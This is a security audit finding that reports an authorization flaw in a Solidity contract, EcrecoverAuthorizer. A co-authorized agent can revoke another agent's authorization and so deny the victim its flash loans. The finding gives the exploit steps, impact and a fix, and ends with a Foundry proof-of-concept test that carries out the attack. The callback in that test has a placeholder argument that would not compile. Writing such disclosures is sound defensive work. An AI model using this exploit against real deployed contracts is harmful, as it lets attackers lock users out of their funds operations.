### Title
Authorized co-agent can deauthorize any other agent of the same principal via EcrecoverAuthorizer — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for, without restricting what `authorized` target or `isAuthorized` value the signer may set. A co-authorized attacker can therefore sign and submit an `Authorization(authorizer=victim, authorized=flashLoanAgent, isAuthorized=false)` to strip the victim's flash-loan callback contract of its authorization, causing every subsequent `flashLoan` call that relies on that callback to revert.

### Finding Description

**Root cause — `EcrecoverAuthorizer.setIsAuthorized` lines 33-36:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

Any address that is already authorized by `authorization.authorizer` satisfies this check. There is no restriction on:
- which `authorization.authorized` address the signer may target, and
- whether `authorization.isAuthorized` may be `false` (a revocation).

**Exploit flow:**

Preconditions (all normal user operations):
1. Victim calls `Midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` — required to let `EcrecoverAuthorizer` act on victim's behalf.
2. Victim calls `Midnight.setIsAuthorized(flashLoanAgent, true, victim)` — authorizes the flash-loan callback contract.
3. Victim calls `Midnight.setIsAuthorized(attacker, true, victim)` — authorizes the attacker for some other purpose.

Attack:
4. Attacker reads `ecrecoverAuthorizer.nonce(victim)` → `N` (public storage).
5. Attacker constructs `Authorization { authorizer: victim, authorized: flashLoanAgent, isAuthorized: false, nonce: N, deadline: far_future }` and signs it with the attacker's own key.
6. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
   - Line 25: deadline check passes (attacker chose the deadline).
   - Line 26: nonce `N` matches, increments to `N+1`.
   - Lines 31-36: `signer = attacker`; `isAuthorized[victim][attacker] == true` → passes.
   - Line 47: calls `Midnight.setIsAuthorized(flashLoanAgent, false, victim)`.
     - Line 732: `isAuthorized[victim][ecrecoverAuthorizer] == true` → passes.
     - Line 733: `isAuthorized[victim][flashLoanAgent] = false`.

Result: `flashLoanAgent` is deauthorized. When victim subsequently calls `Midnight.flashLoan(tokens, assets, flashLoanAgent, data)`, the callback's internal call to `repay`/`take`/`withdraw` on behalf of victim hits the `Unauthorized()` check at `Midnight.setIsAuthorized` line 732 (or any other `onBehalf`-guarded function), causing the callback to revert, which propagates as `WrongFlashLoanCallbackReturnValue` at line 746-748.

The attack is repeatable: after the victim re-authorizes `flashLoanAgent`, the attacker reads the new public nonce and repeats step 5-6 immediately, creating a persistent DoS.

### Impact Explanation
Every `flashLoan`-based atomic operation (repay, take, withdraw, liquidate, claim fee) that relies on `flashLoanAgent` being authorized to act on behalf of victim is permanently blocked at zero cost to the attacker (only gas). The victim cannot durably re-authorize `flashLoanAgent` because the attacker can front-run or immediately follow any re-authorization with another revocation using the next nonce.

### Likelihood Explanation
Preconditions are realistic: multi-agent setups (trading bot + flash-loan helper + liquidation agent all authorized by the same user) are the primary use case for the authorization system. The attacker needs only to be one of those co-authorized agents. The attack requires no special capital, no oracle manipulation, and no privileged access — only the attacker's own private key and knowledge of the victim's current `EcrecoverAuthorizer` nonce (public storage). It is repeatable indefinitely.

### Recommendation
Restrict `EcrecoverAuthorizer.setIsAuthorized` so that a delegated signer (one who is not the `authorizer` themselves) may only grant authorizations (`isAuthorized == true`), never revoke them. Revocations must require a signature from `authorization.authorizer` directly:

```solidity
require(
    signer == authorization.authorizer
        || (
            authorization.isAuthorized   // delegated signers may only grant, not revoke
            && IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)
        ),
    Unauthorized()
);
```

Alternatively, remove the delegated-signer path entirely and require the signature to always come from `authorization.authorizer`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IFlashLoanCallback} from "../src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";
import {IMidnight} from "../src/interfaces/IMidnight.sol";

contract FlashLoanAgentDoSPoC is BaseTest, IFlashLoanCallback {
    address victim;
    uint256 victimKey;
    address attacker;
    uint256 attackerKey;
    address flashLoanAgent; // this contract itself

    function setUp() public override {
        super.setUp();
        (victim, victimKey) = makeAddrAndKey("victim");
        (attacker, attackerKey) = makeAddrAndKey("attacker");
        flashLoanAgent = address(this);
    }

    function testCoAgentDeauthorizesFlashLoanAgent() public {
        // Step 1: victim authorizes ecrecoverAuthorizer
        vm.prank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

        // Step 2: victim authorizes flashLoanAgent
        vm.prank(victim);
        midnight.setIsAuthorized(flashLoanAgent, true, victim);

        // Step 3: victim authorizes attacker for some other purpose
        vm.prank(victim);
        midnight.setIsAuthorized(attacker, true, victim);

        // Confirm flashLoanAgent is authorized
        assertTrue(midnight.isAuthorized(victim, flashLoanAgent));

        // Step 4-6: attacker deauthorizes flashLoanAgent via EcrecoverAuthorizer
        uint256 currentNonce = ecrecoverAuthorizer.nonce(victim);
        Authorization memory auth = Authorization({
            authorizer: victim,
            authorized: flashLoanAgent,
            isAuthorized: false,
            nonce: currentNonce,
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);

        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, Signature({v: v, r: r, s: s}));

        // Assert: flashLoanAgent is now deauthorized
        assertFalse(midnight.isAuthorized(victim, flashLoanAgent));

        // Assert: flashLoan using flashLoanAgent as callback now reverts
        address[] memory tokens = new address[](1);
        tokens[0] = address(loanToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;
        deal(address(loanToken), address(midnight), 1);

        vm.expectRevert(IMidnight.WrongFlashLoanCallbackReturnValue.selector);
        midnight.flashLoan(tokens, amounts, flashLoanAgent, abi.encode(victim));
    }

    // Callback tries to act on behalf of victim — reverts because deauthorized
    function onFlashLoan(address, address[] memory tokens, uint256[] memory, bytes memory data)
        external returns (bytes32)
    {
        address _victim = abi.decode(data, (address));
        // This call requires isAuthorized[victim][flashLoanAgent] == true
        midnight.repay(/* market */, 0, _victim, address(0), hex"");
        return CALLBACK_SUCCESS;
    }
}
```
